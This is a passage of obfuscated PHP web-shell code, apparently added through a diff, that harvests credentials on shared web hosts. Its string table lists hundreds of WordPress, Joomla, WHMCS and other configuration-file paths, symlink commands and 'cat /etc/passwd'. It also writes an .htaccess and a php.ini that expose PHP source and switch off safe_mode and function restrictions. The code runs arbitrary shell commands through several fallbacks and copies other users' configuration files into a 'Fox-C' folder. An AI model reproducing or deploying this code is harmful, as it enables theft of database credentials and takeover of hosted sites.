=> "/web/new/wp-config.php Fox-C/", 889 => "-wordpress-new.txt", 890 => "/web/old/wp-config.php Fox-C/", 891 => "-wordpress-old.txt", 892 => "ln -s ", 893 => "/web/web/configuration.php Fox-C/", 894 => "-joomla-web.txt", 895 => "/web/configuration.php Fox-C/", 896 => "-joomla.txt", 897 => "ln -s ", 898 => "/web/opencart/config.php Fox-C/", 899 => "-opencart-opencart.txt", 900 => "/web/blog/wp-config.php Fox-C/", 901 => "-wordpress-blog.txt", 902 => "/web/wp/wp-config.php Fox-C/", 903 => "-wordpress-wp.txt", 904 => "/web/portal/configuration.php Fox-C/", 905 => "-joomla-portal.txt", 906 => "/web/demo/wp-config.php Fox-C/", 907 => "-wordpress-demo.txt", 908 => "/web/config.php Fox-C/", 909 => "-opencart.txt", 910 => "/web/demo/configuration.php Fox-C/", 911 => "-joomla-demo.txt", 912 => "/web/configuration.php Fox-C/", 913 => "-joomla.txt", 914 => "/web/wordpress/wp-config.php Fox-C/", 915 => "-wordpress-wordpress.txt", 916 => "ln -s ", 917 => "/web/drupal/sites/default/settings.php Fox-C/", 918 => "-drupal2.txt", 919 => "/web/test/wp-config.php Fox-C/", 920 => "-wordpress-test.txt", 921 => "/web/wp-config.php Fox-C/", 922 => "-wordpress.txt", 923 => "/web/test/configuration.php Fox-C/", 924 => "-joomla-test.txt", 925 => "Fox-C/.htaccess", 926 => "Fox-C", 927 => "/etc/passwd", 928 => "<b>loading...</b><br><br>", 929 => "<h1>Config Vhost</h1><div class=content>", 930 => "/web/beta/wp-config.php Fox-C/", 931 => "-wordpress-beta.txt", 932 => "/web/opencart/config.php Fox-C/", 933 => "opencart-opencart.txt", 934 => "/web/config.php Fox-C/", 935 => "-opencart.txt", 936 => "ln -s ", 937 => "/web/wp-config.php Fox-C/", 938 => "-wordpress.txt", 939 => "/web/web/configuration.php Fox-C/", 940 => "-joomla-web.txt", 941 => "/web/opencart/config.php Fox-C/", 942 => "-opencart-opencart.txt", 943 => "/web/wp/wp-config.php Fox-C/", 944 => "-wordpress-wp.txt", 945 => "/web/new/configuration.php Fox-C/", 946 => "-joomla-new.txt", 947 => "/web/wordpress/wp-config.php Fox-C/", 948 => "-wordpress-wordpress.txt", 949 => "/web/new/wp-config.php Fox-C/", 950 => "-wordpress-new.txt", 951 => "/web/blog/wp-config.php Fox-C/", 952 => "-wordpress-blog.txt", 953 => "/web/demo/configuration.php Fox-C/", 954 => "-joomla-demo.txt", 955 => "ln -s ", 956 => "/web/test/configuration.php Fox-C/", 957 => "-joomla-test.txt", 958 => "/web/sites/default/settings.php Fox-C/", 959 => "-drupal.txt", 960 => "/web/demo/wp-config.php Fox-C/", 961 => "-wordpress-demo.txt", 962 => "/web/configuration.php Fox-C/", 963 => "-joomla.txt", 964 => "/web/wp-config.php Fox-C/", 965 => "-wordpress.txt", 966 => "/web/site/wp-config.php Fox-C/", 967 => "-wordpress-site.txt", 968 => "/web/configuration.php Fox-C/", 969 => "-joomla.txt", 970 => "/web/portal/configuration.php Fox-C/", 971 => "-joomla-portal.txt", 972 => "/web/site/configuration.php Fox-C/", 973 => "-joomla-site.txt", 974 => "/web/old/wp-config.php Fox-C/", 975 => "-wordpress-old.txt", 976 => "/web/web/wp-config.php Fox-C/", 977 => "-wordpress-web.txt", 978 => "/web/test/wp-config.php Fox-C/", 979 => "-wordpress-test.txt", 980 => "/web/old/configuration.php Fox-C/", 981 => "-joomla-old.txt", 982 => "/web/joomla/configuration.php Fox-C/", 983 => "-joomla-joomla.txt", 984 => "/web/drupal/sites/default/settings.php Fox-C/", 985 => "-drupal2.txt", 986 => "passwd", 987 => "<h1>Config Vhost</h1><div class=content>", 988 => "Fox-C/.htaccess", 989 => "Fox-C", 990 => "<b>loading...</b><br><br>", 991 => "cat /etc/passwd > passwd", 992 => "<b>Done! -> ", 993 => "/Fox-C/</b><br><br></td></table>", 994 => "/public_html/wp/wp-config.php", 995 => "-wordpress-wp.txt", 996 => "/public_html/web/wp-config.php", 997 => "-wordpress-web.txt", 998 => "/public_html/portal/configuration.php", 999 => "-joomla-portal.txt", 1000 => "/public_html/includes/iso4217.php", 1001 => "-Hostbills.txt", 1002 => "/public_html/clients/includes/iso4217.php", 1003 => "-clients-Hostbills.txt", 1004 => "/public_html/sites/default/settings.php", 1005 => "-drupal.txt", 1006 => "/public_html/new/configuration.php", 1007 => "-joomla-new.txt", 1008 => "/public_html/old/wp-config.php", 1009 => "-wordpress-old.txt", 1010 => "/public_html/wordpress/wp-config.php", 1011 => "-wordpress-wordpress.txt", 1012 => "/home/", 1013 => "/public_html/blogs/wp-config.php", 1014 => "-wordpress-blogs.txt", 1015 => "/public_html/bb-config.php", 1016 => "-BoxBilling.txt", 1017 => "/public_html/client/configuration.php", 1018 => "-client-WHMCS.txt", 1019 => "/public_html/configuration.php", 1020 => "-joomla.txt", 1021 => "/public_html/appuser/functions.php", 1022 => "-tr.txt", 1023 => "/public_html/drupal/sites/default/settings.php", 1024 => "-drupal2.txt", 1025 => "/public_html/vb/includes/config.php", 1026 => "-vb.txt", 1027 => "/public_html/site/configuration.php", 1028 => "-joomla-site.txt", 1029 => "/public_html/includes/dist-configure.php", 1030 => "-Zencart.txt", 1031 => "/public_html/whmcs/configuration.php", 1032 => "-whmcs-WHMCS.txt", 1033 => "/public_html/test/configuration.php", 1034 => "-joomla-test.txt", 1035 => "/public_html/wp/wp-config.php", 1036 => "-wordpress-wp.txt", 1037 => "/public_html/billing/includes/iso4217.php", 1038 => "-billing-Hostbills.txt", 1039 => "/public_html/forum/includes/config.php", 1040 => "-forum.txt", 1041 => "/public_html/demo/configuration.php", 1042 => "-joomla-demo.txt", 1043 => "/public_html/beta/wp-config.php", 1044 => "-wordpress-beta.txt", 1045 => "/public_html/bb-config.php", 1046 => "-BoxBilling.txt", 1047 => "/public_html/billing/configuration.php", 1048 => "-billing-WHMCS.txt", 1049 => "/public_html/includes/config.php", 1050 => "-vb2.txt", 1051 => "/public_html/config/settings.inc.php", 1052 => "-PrestaShop.txt", 1053 => "/public_html/support/config/blesta.php", 1054 => "-support-Blesta.txt", 1055 => "/public_html/old/wp-config.php", 1056 => "-wordpress-old.txt", 1057 => "/public_html/include/config.php", 1058 => "-10.txt", 1059 => "/public_html/member/configuration.php", 1060 => "-member-WHMCS.txt", 1061 => "/public_html/new/wp-config.php", 1062 => "-wordpress-new.txt", 1063 => "/public_html/connect.php", 1064 => "/public_html/boxbilling/bb-config.php", 1065 => "-boxbilling-BoxBilling.txt", 1066 => "/public_html/wordpress/wp-config.php", 1067 => "-wordpress-wordpress.txt", 1068 => "/public_html/config/blesta.php", 1069 => "-Blesta.txt", 1070 => "/public_html/mk_conf.php", 1071 => "-9.txt", 1072 => "/public_html/include/db.php", 1073 => "-7.txt", 1074 => "/public_html/hostbills/includes/iso4217.php", 1075 => "-hostbills-Hostbills.txt", 1076 => "/public_html/include/db.php", 1077 => "-7.txt", 1078 => "/public_html/demo/wp-config.php", 1079 => "-wordpress-demo.txt", 1080 => "/public_html/member/configuration.php", 1081 => "-member-WHMCS.txt", 1082 => "/home/", 1083 => "/public_html/clients/includes/iso4217.php", 1084 => "-clients-Hostbills.txt", 1085 => "/public_html/blog/wp-config.php", 1086 => "-wordpress-blog.txt", 1087 => "/public_html/demo/wp-config.php", 1088 => "-wordpress-demo.txt", 1089 => "/public_html/support/bb-config.php", 1090 => "-support-BoxBilling.txt", 1091 => "/public_html/blogs/wp-config.php", 1092 => "-wordpress-blogs.txt", 1093 => "/public_html/vb/includes/config.php", 1094 => "-vb.txt", 1095 => "/public_html/support/configuration.php", 1096 => "-support-WHMCS.txt", 1097 => "/public_html/site/configuration.php", 1098 => "-joomla-site.txt", 1099 => "/public_html/my/configuration.php", 1100 => "-my-WHMCS.txt", 1101 => "/public_html/support/configuration.php", 1102 => "-support-WHMCS.txt", 1103 => "/public_html/forums/includes/config.php", 1104 => "-forums.txt", 1105 => "/public_html/test/configuration.php", 1106 => "-joomla-test.txt", 1107 => "/public_html/clients/configuration.php", 1108 => "-clients-WHMCS.txt", 1109 => "/public_html/whmcs/configuration.php", 1110 => "-whmcs-WHMCS.txt", 1111 => "/public_html/web/configuration.php", 1112 => "-joomla-web.txt", 1113 => "/public_html/clientarea/configuration.php", 1114 => "-clientarea-WHMCS.txt", 1115 => "/public_html/zencart/includes/dist-configure.php", 1116 => "-zencart-Zencart.txt", 1117 => "/public_html/joomla/configuration.php", 1118 => "-joomla-joomla.txt", 1119 => "/public_html/new/wp-config.php", 1120 => "-wordpress-new.txt", 1121 => "/home/", 1122 => "/public_html/clients/bb-config.php", 1123 => "-clients-BoxBilling.txt", 1124 => "/public_html/web/wp-config.php", 1125 => "-wordpress-web.txt", 1126 => "/public_html/sites/default/settings.php", 1127 => "-drupal.txt", 1128 => "/public_html/billing/bb-config.php", 1129 => "-billing-BoxBilling.txt", 1130 => "/home/", 1131 => "/public_html/config/settings.inc.php", 1132 => "-PrestaShop.txt", 1133 => "/public_html/billing/config/blesta.php", 1134 => "-billing-Blesta.txt", 1135 => "/public_html/configuration.php", 1136 => "-joomla.txt", 1137 => "/public_html/demo/configuration.php", 1138 => "-joomla-demo.txt", 1139 => "/public_html/connect.php", 1140 => "-8.txt", 1141 => "/public_html/beta/wp-config.php", 1142 => "-wordpress-beta.txt", 1143 => "/public_html/clients/bb-config.php", 1144 => "-clients-BoxBilling.txt", 1145 => "/public_html/config.php", 1146 => "-OpenCart.txt", 1147 => "/public_html/old/configuration.php", 1148 => "-joomla-old.txt", 1149 => "/public_html/billing/bb-config.php", 1150 => "-billing-BoxBilling.txt", 1151 => "/public_html/blesta/config/blesta.php", 1152 => "-blesta-Blesta.txt", 1153 => "/public_html/includes/iso4217.php", 1154 => "-Hostbills.txt", 1155 => "/public_html/conf_global.php", 1156 => "-6.txt", 1157 => "/public_html/clients/config/blesta.php", 1158 => "-clients-Blesta.txt", 1159 => "/public_html/zencart/includes/dist-configure.php", 1160 => "-zencart-Zencart.txt", 1161 => "/public_html/blog/wp-config.php", 1162 => "-wordpress-blog.txt", 1163 => "/public_html/config.php", 1164 => "-OpenCart.txt", 1165 => "/public_html/conf_global.php", 1166 => "-6.txt", 1167 => "/public_html/mk_conf.php", 1168 => "-9.txt", 1169 => "/public_html/appuser/functions.php", 1170 => "-tr.txt", 1171 => "/public_html/billing/configuration.php", 1172 => "-billing-WHMCS.txt", 1173 => "/public_html/wp-config.php", 1174 => "-wordpress.txt", 1175 => "/public_html/support/includes/iso4217.php", 1176 => "-support-Hostbills.txt", 1177 => "/public_html/support/config/blesta.php", 1178 => "-support-Blesta.txt", 1179 => "/public_html/boxbilling/bb-config.php", 1180 => "-boxbilling-BoxBilling.txt", 1181 => "/public_html/include/config.php", 1182 => "-10.txt", 1183 => "/public_html/new/configuration.php", 1184 => "-joomla-new.txt", 1185 => "/public_html/site/wp-config.php", 1186 => "-wordpress-site.txt", 1187 => "/public_html/forum/includes/config.php", 1188 => "-forum.txt", 1189 => "/public_html/drupal/sites/default/settings.php", 1190 => "-drupal2.txt", 1191 => "/public_html/wp-config.php", 1192 => "-wordpress.txt", 1193 => "/public_html/admin/conf.php", 1194 => "-5.txt", 1195 => "/public_html/clients/configuration.php", 1196 => "-clients-WHMCS.txt", 1197 => "/public_html/my/configuration.php", 1198 => "-my-WHMCS.txt", 1199 => "/public_html/support/bb-config.php", 1200 => "-support-BoxBilling.txt", 1201 => "/public_html/billing/config/blesta.php", 1202 => "-billing-Blesta.txt", 1203 => "/public_html/clients/config/blesta.php", 1204 => "-clients-Blesta.txt", 1205 => "/public_html/joomla/configuration.php", 1206 => "-joomla-joomla.txt", 1207 => "/public_html/client/configuration.php", 1208 => "-client-WHMCS.txt", 1209 => "/public_html/portal/wp-config.php", 1210 => "-wordpress-portal.txt", 1211 => "/public_html/portal/wp-config.php", 1212 => "-wordpress-portal.txt", 1213 => "/public_html/billing/includes/iso4217.php", 1214 => "-billing-Hostbills.txt", 1215 => "/public_html/portal/configuration.php", 1216 => "-joomla-portal.txt", 1217 => "/public_html/web/configuration.php", 1218 => "-joomla-web.txt", 1219 => "/public_html/forums/includes/config.php", 1220 => "-forums.txt", 1221 => "/public_html/includes/config.php", 1222 => "-vb2.txt", 1223 => "/public_html/includes/dist-configure.php", 1224 => "-Zencart.txt", 1225 => "/public_html/config/blesta.php", 1226 => "-Blesta.txt", 1227 => "/public_html/test/wp-config.php", 1228 => "-wordpress-test.txt", 1229 => "/public_html/blesta/config/blesta.php", 1230 => "-blesta-Blesta.txt", 1231 => "/public_html/site/wp-config.php", 1232 => "-wordpress-site.txt", 1233 => "/public_html/admin/conf.php", 1234 => "-5.txt", 1235 => "/public_html/old/configuration.php", 1236 => "-joomla-old.txt", 1237 => "/public_html/support/includes/iso4217.php", 1238 => "-support-Hostbills.txt", 1239 => "/public_html/clientarea/configuration.php", 1240 => "-clientarea-WHMCS.txt", 1241 => "/public_html/test/wp-config.php", 1242 => "-wordpress-test.txt", 1243 => "/public_html/hostbills/includes/iso4217.php", 1244 => "-hostbills-Hostbills.txt", 1245 => "/etc/passwd", 1246 => "<h1>Config auto grab</h1><div class=content>", 1247 => "Fox-C", 1248 => "<b>loading...</b><br><br>", 1249 => "/ UTC /", 1250 => "/ MSK /", 1251 => "Error-Config", 1252 => "Fox-C", 1253 => ".htaccess", 1254 => "ForceType text/plain\r\nAddType text/plain .php\r\nAddType text/plain .html\r\nAddType text/html .shtml\r\nAddType txt .php\r\nAddHandler server-parsed .php\r\nAddHandler txt .php\r\nAddHandler txt .html\r\nAddHandler txt .shtml\r\nOptions All", 1255 => "<b>Done! -> ", 1256 => "</b><br><br></td></table>", 1257 => "posix_getegid", 1258 => "?", 1259 => "name", 1260 => "gid", 1261 => "uid", 1262 => "name", 1263 => "#/home/(.*)/public_html/#", 1264 => "#/home/(.*)/public_html/#", 1265 => "WorkingV6-1.txt\n", 1266 => "check", 1267 => "WorkingV6-2.txt\n", 1268 => "php.ini", 1269 => "w", 1270 => "safe_mode = Off\r\ndisable_functions = NONE\r\nsafe_mode_gid = OFF\r\nopen_basedir = OFF\r\nexec = ON \r\nshell_exec = ON", 1271 => "https://", 1272 => "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0");
+error_reporting(0);
+@ini_set($GLOBALS[äØ][0x1b9], NULL);
+@ini_set($GLOBALS[äØ][0x232], 0);
+@ini_set($GLOBALS[äØ][0x1b2], 0);
+echo "WorkingV6-1.txt\n";
+if (isset($_POST[$GLOBALS[äØ][0x4f2]])) {
+    $u5hXK = $GLOBALS[äØ][0x4f6];
+    fwrite(fopen($GLOBALS[äØ][0x4f4], $GLOBALS[äØ][0x4f5]), $u5hXK);
+    echo "WorkingV6-2.txt\n";
+}
+function ByqTyy($Jfpd4)
+{
+    $lWsAL = $GLOBALS[äØ][0x1b5];
+    if (function_exists($GLOBALS[äØ][0x235])) {
+        @exec($Jfpd4, $lWsAL);
+        $lWsAL = @join($GLOBALS[äØ][0x7], $lWsAL);
+    } elseif (function_exists($GLOBALS[äØ][0x236])) {
+        ob_start();
+        @passthru($Jfpd4);
+        $lWsAL = ob_get_clean();
+    } elseif (function_exists($GLOBALS[äØ][0x237])) {
+        ob_start();
+        @system($Jfpd4);
+        $lWsAL = ob_get_clean();
+    } elseif (function_exists($GLOBALS[äØ][0x238])) {
+        $lWsAL = shell_exec($Jfpd4);
+    } elseif (is_resource($koEfC = @popen($Jfpd4, $GLOBALS[äØ][0x239]))) {
+        $lWsAL = $GLOBALS[äØ][0x1b5];
+        gAls1:
+        if (@feof($koEfC)) {
+            pclose($koEfC);
+        }
+        $lWsAL .= fread($koEfC, 0x400);
+        goto gAls1;
+    }
+    return $lWsAL;
+}
+function ByCGQy()
+{
+    $lWsAL = curl_init();
+    curl_setopt($lWsAL, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
+    curl_setopt($lWsAL, CURLOPT_CONNECTTIMEOUT, 0x1e);
+    curl_setopt($lWsAL, CURLOPT_TIMEOUT, 0x1e);
+    curl_setopt($lWsAL, CURLOPT_FOLLOWLOCATION, 0x1);
+    curl_setopt($lWsAL, CURLOPT_SSL_VERIFYPEER, 0);
+    curl_setopt($lWsAL, CURLOPT_SSL_VERIFYHOST, 0);
+    curl_setopt($lWsAL, CURLOPT_RETURNTRANSFER, !0);
+    curl_setopt($lWsAL, CURLOPT_URL, $GLOBALS[äØ][0x1be].$_SERVER[$GLOBALS[äØ][0x1bc]] . $_SERVER[$GLOBALS[äØ][0x1bd]]);
+    curl_setopt($lWsAL, CURLOPT_CONNECTTIMEOUT, 0x9);
+    curl_exec($lWsAL);
+    curl_close($lWsAL);
+    return;
+}
+$QJQfs = @getcwd();
+if (!function_exists($GLOBALS[äØ][0x4e9])) {
+    $z12px = @get_current_user();
+    $FKDQ8 = @getmyuid();
+    $fKlFW = @getmygid();
+    $gVanp = $GLOBALS[äØ][0x4ea];
+} else {
+    $FKDQ8 = @posix_getpwuid(posix_geteuid());
+    $fKlFW = @posix_getgrgid(posix_getegid());
+    $z12px = $FKDQ8[$GLOBALS[äØ][0x4ee]];
+    $FKDQ8 = $FKDQ8[$GLOBALS[äØ][0x4ed]];
+    $gVanp = $fKlFW[$GLOBALS[äØ][0x4eb]];
+    $fKlFW = $fKlFW[$GLOBALS[äØ][0x4ec]];
+}
+if (empty($z12px)) {
+    if (preg_match_all($GLOBALS[äØ][0x4ef], $QJQfs, $RIh7N)) {
+        preg_match_all($GLOBALS[äØ][0x4f0], $QJQfs, $RIh7N);
+        $z12px = $RIh7N[0x1][0];
+    }
+}
+preg_match_all("#/home(.*){$z12px}/#", $QJQfs, $DpgJB);
+$NeKwm = $DpgJB[0x1][0];
+echo $GLOBALS[äØ][0];
+$peixv = trim($_POST[$GLOBALS[äØ][0x1b8]]);
+$C1qVx = trim($_POST[$GLOBALS[äØ][0x1bb]]);
+$Q0joF = trim($_POST[$GLOBALS[äØ][0x231]]);
+$knzAk = $_POST[$GLOBALS[äØ][0x1ba]];
+
+if ($Q0joF == $GLOBALS[äØ][0x1]) {
+    $FKDQ8 = 0;
+    eQSNe:
+    if (!true) {
+        echo $GLOBALS[äØ][0x3];
+        @mkdir($GLOBALS[äØ][0x6], 0755);
+        $prgj5 = $GLOBALS[äØ][0x2];
+        file_put_contents($GLOBALS[äØ][0x4], $prgj5);
+        if (file_exists($GLOBALS[äØ][0xc])) {
+            $XSVrw = file_get_contents($GLOBALS[äØ][0x9]);
+        } else {
+            $XSVrw = file_get_contents($GLOBALS[äØ][0xd]);
+        }
+        $XSVrw = explode($GLOBALS[äØ][0x7], $XSVrw);
+        echo $GLOBALS[äØ][0x5];
+        foreach ($XSVrw as $QJQfs) {
+            $paogY = explode($GLOBALS[äØ][0x13c], $QJQfs);
+            $lpoyk = $paogY[0];
+            @copy($GLOBALS[äØ][0x6f] . $lpoyk . $GLOBALS[äØ][0x70], $GLOBALS[äØ][0x71] . $lpoyk . $GLOBALS[äØ][0x72]);
+            @copy($GLOBALS[äØ][0x64] . $lpoyk . $GLOBALS[äØ][0x65], $GLOBALS[äØ][0x66] . $lpoyk . $GLOBALS[äØ][0x67]);
+            @copy($GLOBALS[äØ][0x3a] . $lpoyk . $GLOBALS[äØ][0x3b], $GLOBALS[äØ][0x3c] . $lpoyk . $GLOBALS[äØ][0x3d]);
+            @copy($GLOBALS[äØ][0x16] . $lpoyk . $GLOBALS[äØ][0x193], $GLOBALS[äØ][0x159] . $lpoyk . $GLOBALS[äØ][0x194]);
+            @copy($GLOBALS[äØ][0x140] . $lpoyk . $GLOBALS[äØ][0x141], $GLOBALS[äØ][0x142] . $lpoyk . $GLOBALS[äØ][0x143]);
+            @copy($GLOBALS[äØ][0x1e] . $lpoyk . $GLOBALS[äØ][0x6c], $GLOBALS[äØ][0x6d] . $lpoyk . $GLOBALS[äØ][0x6e]);
+            @copy($GLOBALS[äØ][0xe] . $lpoyk . $GLOBALS[äØ][0xf], $GLOBALS[äØ][0x10] . $lpoyk . $GLOBALS[äØ][0x11]);
+            @copy($GLOBALS[äØ][0x49] . $lpoyk . $GLOBALS[äØ][0x4a], $GLOBALS[äØ][0x4b] . $lpoyk . $GLOBALS[äØ][0x4c]);
+            @copy($GLOBALS[äØ][0x32] . $lpoyk . $GLOBALS[äØ][0x198], $GLOBALS[äØ][0x199] . $lpoyk . $GLOBALS[äØ][0x19a]);
+            @copy($GLOBALS[äØ][0x26] . $lpoyk . $GLOBALS[äØ][0x10a], $GLOBALS[äØ][0x102] . $lpoyk . $GLOBALS[äØ][0x10b]);
+            @copy($GLOBALS[äØ][0x64] . $lpoyk . $GLOBALS[äØ][0x7b], $GLOBALS[äØ][0x7c] . $lpoyk . $GLOBALS[äØ][0x7d]);
+            @copy($GLOBALS[äØ][0x36] . $lpoyk . $GLOBALS[äØ][0x13d], $GLOBALS[äØ][0x13e] . $lpoyk . $GLOBALS[äØ][0x13f]);
+            @copy($GLOBALS[äØ][0xd1] . $lpoyk . $GLOBALS[äØ][0x12c], $GLOBALS[äØ][0x12d] . $lpoyk . $GLOBALS[äØ][0x12e]);
+            @copy($GLOBALS[äØ][0x77] . $lpoyk . $GLOBALS[äØ][0x78], $GLOBALS[äØ][0x79] . $lpoyk . $GLOBALS[äØ][0x7a]);
+            @copy($GLOBALS[äØ][0x16] . $lpoyk . $GLOBALS[äØ][0x17f], $GLOBALS[äØ][0x180] . $lpoyk . $GLOBALS[äØ][0x181]);
+            @copy($GLOBALS[äØ][0x16] . $lpoyk . $GLOBALS[äØ][0x91], $GLOBALS[äØ][0x92] . $lpoyk . $GLOBALS[äØ][0x93]);
+            @copy($GLOBALS[äØ][0x2e] . $lpoyk . $GLOBALS[äØ][0x104], $GLOBALS[äØ][0x105] . $lpoyk . $GLOBALS[äØ][0x106]);
+            @copy($GLOBALS[äØ][0x11f] . $lpoyk . $GLOBALS[äØ][0x120], $GLOBALS[äØ][0x121] . $lpoyk . $GLOBALS[äØ][0x122]);
+            @copy($GLOBALS[äØ][0x26] . $lpoyk . $GLOBALS[äØ][0x27], $GLOBALS[äØ][0x28] . $lpoyk . $GLOBALS[äØ][0x29]);
+            @copy($GLOBALS[äØ][0x18f] . $lpoyk . $GLOBALS[äØ][0x190], $GLOBALS[äØ][0x191] . $lpoyk . $GLOBALS[äØ][0x192]);
+            @copy($GLOBALS[äØ][0x1a] . $lpoyk . $GLOBALS[äØ][0x158], $GLOBALS[äØ][0x159] . $lpoyk . $GLOBALS[äØ][0x15a]);
+            @copy($GLOBALS[äØ][0xb8] . $lpoyk . $GLOBALS[äØ][0xb9], $GLOBALS[äØ][0xba] . $lpoyk . $GLOBALS[äØ][0xbb]);
+            @copy($GLOBALS[äØ][0x8d] . $lpoyk . $GLOBALS[äØ][0xea], $GLOBALS[äØ][0xeb] . $lpoyk . $GLOBALS[äØ][0xec]);
+            @copy($GLOBALS[äØ][0x7e] . $lpoyk . $GLOBALS[äØ][0xe3], $GLOBALS[äØ][0xe4] . $lpoyk . $GLOBALS[äØ][0xe5]);
+            @copy($GLOBALS[äØ][0x5c] . $lpoyk . $GLOBALS[äØ][0x176], $GLOBALS[äØ][0x177] . $lpoyk . $GLOBALS[äØ][0x178]);
+            @copy($GLOBALS[äØ][0x82] . $lpoyk . $GLOBALS[äØ][0x83], $GLOBALS[äØ][0x84] . $lpoyk . $GLOBALS[äØ][0x85]);
+            @copy($GLOBALS[äØ][0x1a] . $lpoyk . $GLOBALS[äØ][0xb1], $GLOBALS[äØ][0xb2] . $lpoyk . $GLOBALS[äØ][0xb3]);
+            @copy($GLOBALS[äØ][0x15b] . $lpoyk . $GLOBALS[äØ][0x15c], $GLOBALS[äØ][0x15d] . $lpoyk . $GLOBALS[äØ][0x15e]);
+            @copy($GLOBALS[äØ][0x89] . $lpoyk . $GLOBALS[äØ][0x12f], $GLOBALS[äØ][0x130] . $lpoyk . $GLOBALS[äØ][0x131]);
+            @copy($GLOBALS[äØ][0x42] . $lpoyk . $GLOBALS[äØ][0xc3], $GLOBALS[äØ][0xc4] . $lpoyk . $GLOBALS[äØ][0xc5]);
+            @copy($GLOBALS[äØ][0xd1] . $lpoyk . $GLOBALS[äØ][0x1ab], $GLOBALS[äØ][0x1ac] . $lpoyk . $GLOBALS[äØ][0x1ad]);
+            @copy($GLOBALS[äØ][0x49] . $lpoyk . $GLOBALS[äØ][0x14f], $GLOBALS[äØ][0x4b] . $lpoyk . $GLOBALS[äØ][0x150]);
+            @copy($GLOBALS[äØ][0x182] . $lpoyk . $GLOBALS[äØ][0x183], $GLOBALS[äØ][0x184] . $lpoyk . $GLOBALS[äØ][0x185]);
+            @copy($GLOBALS[äØ][0xb4] . $lpoyk . $GLOBALS[äØ][0xb5], $GLOBALS[äØ][0xb6] . $lpoyk . $GLOBALS[äØ][0xb7]);
+            @copy($GLOBALS[äØ][0x32] . $lpoyk . $GLOBALS[äØ][0x19b], $GLOBALS[äØ][0x19c] . $lpoyk . $GLOBALS[äØ][0x19d]);
+            @copy($GLOBALS[äØ][0xad] . $lpoyk . $GLOBALS[äØ][0x149], $GLOBALS[äØ][0x14a] . $lpoyk . $GLOBALS[äØ][0x14b]);
+            @copy($GLOBALS[äØ][0x16] . $lpoyk . $GLOBALS[äØ][0x17], $GLOBALS[äØ][0x18] . $lpoyk . $GLOBALS[äØ][0x19]);
+            @copy($GLOBALS[äØ][0x58] . $lpoyk . $GLOBALS[äØ][0x115], $GLOBALS[äØ][0x116] . $lpoyk . $GLOBALS[äØ][0x117]);
+            @copy($GLOBALS[äØ][0x2e] . $lpoyk . $GLOBALS[äØ][0x2f], $GLOBALS[äØ][0x30] . $lpoyk . $GLOBALS[äØ][0x31]);
+            @copy($GLOBALS[äØ][0x68] . $lpoyk . $GLOBALS[äØ][0xf7], $GLOBALS[äØ][0xf8] . $lpoyk . $GLOBALS[äØ][0xf9]);
+            @copy($GLOBALS[äØ][0xe6] . $lpoyk . $GLOBALS[äØ][0xfd], $GLOBALS[äØ][0xfe] . $lpoyk . $GLOBALS[äØ][0xff]);
+            @copy($GLOBALS[äØ][0x77] . $lpoyk . $GLOBALS[äØ][0xed], $GLOBALS[äØ][0xee] . $lpoyk . $GLOBALS[äØ][0xef]);
+            @copy($GLOBALS[äØ][0x89] . $lpoyk . $GLOBALS[äØ][0xce], $GLOBALS[äØ][0xcf] . $lpoyk . $GLOBALS[äØ][0xd0]);
+            @copy($GLOBALS[äØ][0x60] . $lpoyk . $GLOBALS[äØ][0xcc], $GLOBALS[äØ][0xa1] . $lpoyk . $GLOBALS[äØ][0xcd]);
+            @copy($GLOBALS[äØ][0xe6] . $lpoyk . $GLOBALS[äØ][0xe7], $GLOBALS[äØ][0xe8] . $lpoyk . $GLOBALS[äØ][0xe9]);
+            @copy($GLOBALS[äØ][0x58] . $lpoyk . $GLOBALS[äØ][0xfa], $GLOBALS[äØ][0xfb] . $lpoyk . $GLOBALS[äØ][0xfc]);
+            @copy($GLOBALS[äØ][0x49] . $lpoyk . $GLOBALS[äØ][0x139], $GLOBALS[äØ][0x13a] . $lpoyk . $GLOBALS[äØ][0x13b]);
+            @copy($GLOBALS[äØ][0x3e] . $lpoyk . $GLOBALS[äØ][0x3f], $GLOBALS[äØ][0x40] . $lpoyk . $GLOBALS[äØ][0x41]);
+            @copy($GLOBALS[äØ][0x112] . $lpoyk . $GLOBALS[äØ][0x132], $GLOBALS[äØ][0x18] . $lpoyk . $GLOBALS[äØ][0x133]);
+            @copy($GLOBALS[äØ][0x45] . $lpoyk . $GLOBALS[äØ][0x46], $GLOBALS[äØ][0x47] . $lpoyk . $GLOBALS[äØ][0x48]);
+            @copy($GLOBALS[äØ][0x8d] . $lpoyk . $GLOBALS[äØ][0x8e], $GLOBALS[äØ][0x8f] . $lpoyk . $GLOBALS[äØ][0x90]);
+            @copy($GLOBALS[äØ][0x77] . $lpoyk . $GLOBALS[äØ][0x136], $GLOBALS[äØ][0x137] . $lpoyk . $GLOBALS[äØ][0x138]);
+            @copy($GLOBALS[äØ][0x60] . $lpoyk . $GLOBALS[äØ][0x61], $GLOBALS[äØ][0x62] . $lpoyk . $GLOBALS[äØ][0x63]);
+            @copy($GLOBALS[äØ][0x112] . $lpoyk . $GLOBALS[äØ][0x161], $GLOBALS[äØ][0x162] . $lpoyk . $GLOBALS[äØ][0x163]);
+            @copy($GLOBALS[äØ][0x186] . $lpoyk . $GLOBALS[äØ][0x189], $GLOBALS[äØ][0x18a] . $lpoyk . $GLOBALS[äØ][0x18b]);
+            @copy($GLOBALS[äØ][0x36] . $lpoyk . $GLOBALS[äØ][0x147], $GLOBALS[äØ][0x11a] . $lpoyk . $GLOBALS[äØ][0x148]);
+            @copy($GLOBALS[äØ][0x1a7] . $lpoyk . $GLOBALS[äØ][0x1a8], $GLOBALS[äØ][0x1a9] . $lpoyk . $GLOBALS[äØ][0x1aa]);
+            @copy($GLOBALS[äØ][0x186] . $lpoyk . $GLOBALS[äØ][0x187], $GLOBALS[äØ][0x14a] . $lpoyk . $GLOBALS[äØ][0x188]);
+            @copy($GLOBALS[äØ][0xbc] . $lpoyk . $GLOBALS[äØ][0xbd], $GLOBALS[äØ][0x10] . $lpoyk . $GLOBALS[äØ][0xbe]);
+            @copy($GLOBALS[äØ][0x94] . $lpoyk . $GLOBALS[äØ][0x95], $GLOBALS[äØ][0x96] . $lpoyk . $GLOBALS[äØ][0x97]);
+            @copy($GLOBALS[äØ][0xd5] . $lpoyk . $GLOBALS[äØ][0xd6], $GLOBALS[äØ][0xd7] . $lpoyk . $GLOBALS[äØ][0xd8]);
